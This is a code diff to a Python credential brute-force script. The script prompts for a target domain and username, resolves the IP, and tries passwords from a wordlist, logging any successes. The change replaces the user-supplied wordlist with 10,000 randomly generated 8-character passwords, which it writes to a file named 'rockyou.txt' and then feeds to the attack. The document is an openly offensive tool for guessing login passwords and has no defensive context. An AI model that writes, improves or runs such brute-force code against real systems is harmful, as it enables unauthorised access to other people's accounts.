@@ -5,9 +5,12 @@ import sys
 import time
 import requests
 import logging
+import random
+import string
 
-logging.basicConfig(filename='bruteforce_success.log', level=logging.INFO, 
+logging.basicConfig(filename='bruteforce_success.log', level=logging.INFO,
                     format='%(asctime)s - %(levelname)s - %(message)s')
+
 
 def get_ip_address(domain):
     try:
@@ -16,11 +19,20 @@ def get_ip_address(domain):
     except socket.gaierror:
         return None
 
+
 def prompt_for_input():
     domain = input("Please enter a domain: ")
     username = input("Enter Username: ")
-    wordlist_path = input("Enter Wordlist file path: ")
-    return domain, username, wordlist_path
+    return domain, username
+
+
+def generate_passwords(filename, count=10000, length=8):
+    characters = string.ascii_letters + string.digits
+    with open(filename, 'w') as f:
+        for _ in range(count):
+            password = ''.join(random.choice(characters) for _ in range(length))
+            f.write(password + '\n')
+
 
 def brute_force(ip_address, username, wordlist_path):
     if not os.path.isfile(wordlist_path):
@@ -51,6 +63,7 @@ def brute_force(ip_address, username, wordlist_path):
     print("Password not found.")
     sys.exit(1)
 
+
 def main():
     print("Choose an option:")
     print("1. Brute Force")
@@ -59,11 +72,9 @@ def main():
     choice = input("Enter your choice (1 or 2): ")
 
     if choice == '1':
-        if len(sys.argv) != 4:
-            print("Domain, username, and wordlist file path are required.")
-            domain, username, wordlist_path = prompt_for_input()
-        else:
-            domain, username, wordlist_path = sys.argv[1:4]
+        domain, username = prompt_for_input()
+        wordlist_path = 'rockyou.txt'
+        generate_passwords(wordlist_path)
 
         ip_address = get_ip_address(domain)
         if not ip_address:
@@ -83,6 +94,7 @@ def main():
     else:
         print("Invalid choice. Please enter 1 or 2.")
         sys.exit(1)
+
 
 if __name__ == '__main__':
     main()
